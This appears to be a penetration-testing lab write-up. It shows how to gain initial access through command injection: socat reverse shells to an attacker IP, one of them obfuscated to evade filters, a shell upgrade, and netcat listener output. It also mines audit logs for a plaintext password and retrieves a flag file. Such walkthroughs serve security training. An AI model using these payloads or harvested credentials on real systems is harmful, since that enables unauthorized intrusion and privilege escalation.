# Initial Access

## Getting a Reverse Shell (from command injection)

```shell-session
socat TCP4:10.10.14.5:8443 EXEC:/bin/bash
```

**reverse shell with filter evation**

```shell-session
%0a's'o'c'a't'${IFS}TCP4:10.10.14.15:8443${IFS}EXEC:bash
```

### Socat Shell upgrade

**start socat listener on host**

```shell-session
socat file:`tty`,raw,echo=0 tcp-listen:4443
```

**Command in action**

```shell-session
nc -lnvp 4443

listening on [any] 8443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.203.111] 52174
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.15:4443
```

### Reading audit logs on linux

**aureport**

```shell-session
aureport --tty | less

Error opening config file (Permission denied)
NOTE - using built-in logs: /var/log/audit/audit.log
WARNING: terminal is not fully functional
-  (press RETURN)
TTY Report
===============================================
# date time event auid term sess comm data
===============================================
1. 06/01/22 07:12:53 349 1004 ? 4 sh "bash",<nl>
2. 06/01/22 07:13:14 350 1004 ? 4 su "ILFreightnixadm!",<nl>
3. 06/01/22 07:13:16 355 1004 ? 4 sh "sudo su srvadm",<nl>
4. 06/01/22 07:13:28 356 1004 ? 4 sudo "ILFreightnixadm!"
5. 06/01/22 07:13:28 360 1004 ? 4 sudo <nl>
6. 06/01/22 07:13:28 361 1004 ? 4 sh "exit",<nl>
7. 06/01/22 07:13:36 364 1004 ? 4 bash "su srvadm",<ret>,"exit",<ret>
```

## Assessment

**Submit the contents of the flag.txt file in the /home/srvadm directory.**

First get a first shell

<figure><img src="../../../.gitbook/assets/image (119).png" alt=""><figcaption><p>%0a's'o'c'a't'${IFS}TCP4:10.10.14.5:8443${IFS}EXEC:bash</p></figcaption></figure>

On the attack machine we get the reverse shell connection.

```
nc -nvlp 8443
listening on [any] 8443 ...
connect to [10.10.14.5] from (UNKNOWN) [10.129.203.114] 46988
```

Get an upgraded shell use the following command on the **attack machine**

```
socat file:tty,raw,echo=0 tcp-listen:4443
```

And the following on the **reverse shell session**.

```
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.5:4443
```

read the contents of the flag.txt

```
webdev@dmz01:/var/www/html/monitoring$ cat /home/srvadm/flag.txt
b447c27a00e3a348881b0030177000cd
```
